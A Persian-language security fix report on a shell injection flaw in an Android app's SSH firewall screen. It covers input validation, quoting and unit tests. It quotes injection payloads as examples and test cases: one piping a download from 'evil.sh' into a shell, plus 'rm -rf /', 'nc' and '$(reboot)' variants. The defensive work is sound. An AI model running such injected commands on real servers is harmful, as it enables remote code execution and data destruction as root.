# گزارش آیتم ۲ فاز  — رفع تزریق shell در SecurityScreen (C6)

تاریخ: ۲۰۲۶-۰۹-۱۳ | push به `main`

## ۱. وضعیت قبل

`SecurityScreen.kt` ورودی کاربر (شماره پورت) را مستقیماً در رشتهٔ shell درج می‌کرد:

```kotlin
SshEngine.execute(server.host, 22, "root", sshPassword, "ufw allow $port/tcp && ufw reload", 15)
```

- **C6:** ورودی `443; curl evil.sh|sh` به‌عنوان **root** روی سرور از طریق SSH اجرا می‌شد.
- **شکست خاموش:** Toast «پورت با موفقیت باز شد!» بدون بررسی `res.isSuccess` نمایش داده می‌شد — حتی اگر ufw خطا بدهد، کاربر موفقیت می‌دید.
- **unban fail2ban:** مقادیر `jail` و `ip` بدون اعتبارسنجی درج می‌شدند و نتیجهٔ دستور چک نمی‌شد (حالا داده‌ها fake است، اما در آیتم ۵ واقعی می‌شود).
- کانال exec پروتکل SSH همواره از shell راه‌انداز می‌شود؛ بنابراین «argv خالص» در این پروتکل ممکن نیست و کنترل استاندارد = allowlist سخت + quoting دفاعی.

## ۲. پیاده‌سازی

### `SecurityValidation.kt` (جدید — منطق خالص، بدون وابستگی Android)
- `validatePort(input): Int?` — فقط ارقام، بازهٔ 1–65535، trim؛ هر کاراکتر غیررقمی (شامل `; | & $ \n ( ) /`) رد می‌شود.
- `shellQuote(arg)` — حباب‌بندی POSIX: `arg.replace("'", "'\\''")` داخل کوتیشن تک؛ ساختار دستور، توسعهٔ متغیر و اجرای دستورات دیگر غیرممکن می‌شود.
- `validateJail` — `[A-Za-z0-9_-]{1,64}`.
- `isValidIpv4` — چهار اکتت 0–255، بدون leading zero، بدون segment اضافی.

### `SecurityScreen.kt`
- `allowPort`: ابتدا `validatePort` (با Toast خطای فارسی در صورت نامعتبری)، سپس آرگومان rule با `shellQuote` و در نهایت **بررسی `res.isSuccess`** — در شکست، stderr واقعی به کاربر نمایش داده می‌شود.
- `unban`: اعتبارسنجی `isValidIpv4` + `validateJail`، quoting هر دو مقدار، بررسی نتیجه؛ آیتم فقط در صورت موفقیت واقعی از لیست حذف می‌شود.
- `inspectFirewall`: دستور کاملاً ثابت (بدون ورودی پویا) — تغییر نیافت.

### `app/build.gradle`
- افزودن `testImplementation 'junit:junit:4.13.2'` (قبلاً هیچ وابستگی تستی نبود و `testDebugUnitTest` بدون آن کار نمی‌کرد).

### `SecurityValidationTest.kt` (جدید — ۱۲ واحدتست)
پوشش: پورت‌های معتبر/نادرست (0، 65536، فاصله، علامت)، **۶ صحنهٔ تزریق shell واقعی** (`443;rm -rf /`، `&& curl|sh`، `| nc`، `$(reboot)`، newline، `1;2`)، jail معتبر/نامعتبر، IPv4 معتبر/نامعتبر (256، leading zero، 3/5 segment، `;rm -rf /`، `%eth0`)، و quoting: عبور دست‌نخوردهٔ کاراکترهای خاص (metacharacter) داخل کوتیشن، escaping صحیح کوتیشن‌های جاسازی‌شده (`a'b` → `'a'\''b'`)، و **تخصیص خاصیت‌محور** «هیچ‌وقت کوتیشن بستهٔ غیرقابل‌کنترل تولید نمی‌شود».

## ۳. شواهد تست

### ۳.۱ تست‌های Kotlin — اجرا شدند و سبز بودند
در این محیط Android SDK و gradle wrapper موجود نیست؛ اما منطق خالص کاملاً مستقل از Android است. kotlinc 2.0.21 دانلود شد و تست‌ها روی JVM اجرا شدند:

```
$ kotlinc SecurityValidation.kt SecurityValidationTest.kt -cp junit.jar -d out
$ java -cp out:junit.jar:hamcrest.jar:kotlin-stdlib.jar org.junit.runner.JUnitCore \
    org.didban.monitor.SecurityValidationTest
JUnit version 4.13.2
............
Time: 0.052
OK (12 tests)
```

### ۳.۲ بررسی بصری diff + صحنه‌های هم‌خانواده
| صحنه | وضعیت |
|---|---|
| `SecurityScreen.allowPort` | ✅ رفع شد (این آیتم) |
| `SecurityScreen.unban` | ✅ رفع شد (این آیتم) |
| `SecurityScreen.inspectFirewall` | دستور ثابت، بدون ورودی پویا — امن |
| `BatchExecScreen` (executeBatch) | کاربر خودش دستور را تایپ می‌کند (ابزار exec عمدی) — خارج از دامنهٔ تزریق |
| `SshTerminalScreen` | همان — تایپ دستورات توسط کاربر، عمدی |
| `SinglePortEngine` (HAProxy) | مقادیر درج‌شده فقط base64 NO_WRAP (حروف‌های امن، داخل کوتیشن) + دستورات ثابت — بررسی شد، امن |
| `SystemdScreen` (unit/action) | داده‌ها فعلاً fake hardcoded است → بدون ورودی کاربر؛ **در آیتم ۵ (C5) با واقعی‌شدن داده‌ها، همین quoting اعمال می‌شود** |

## ۴. آنچه با این محیط قابل تست نبود (صریح)

**این بخش به دلیل نبود Android SDK و gradle wrapper در محیط کار، امکان build و اجرای کامل اپ و واحدتست‌ها از طریق Gradle را نداشت.** به‌جای آن:
- هستهٔ منطق (SecurityValidation + ۱۲ تست) با kotlinc مستقیم کامپایل و اجرا شد — سبز.
- تغییرات `SecurityScreen.kt` و `build.gradle` فقط از نظر کد بررسی شدند (diff مروری + تطبیق با API موجود `SshExecResult`/`SshEngine.execute`) و باید در اولین build واقعی شما (AS یا CI) تأیید شوند. واحدتست‌ها با افزودن `testImplementation junit` از همان مسیر Gradle (`testDebugUnitTest`) هم قابل اجراست.

## ۵. تحلیل رگرسیون

- رفتار UI بدون تغییر باقی ماند: همان فیلد، همان دکمه؛ فقط ورودی‌های نامعتبر به‌جای ارسال، با پیام مشخص رد می‌شوند.
- برای ورودی معتبر، خروجی دستور: `ufw allow '443/tcp' && ufw reload` — سازگاری کامل با ufw (کوتیشن‌ها توسط shell حذف می‌شوند).
- هیچ API/کنتراکتی تغییر نکرده؛ `SshEngine` دست نخورده است.

## ۶. گام بعدی (آیتم ۳)

C3 — SSH TOFU (trust-on-first-use برای کلید میزبان) در `SshEngine`.
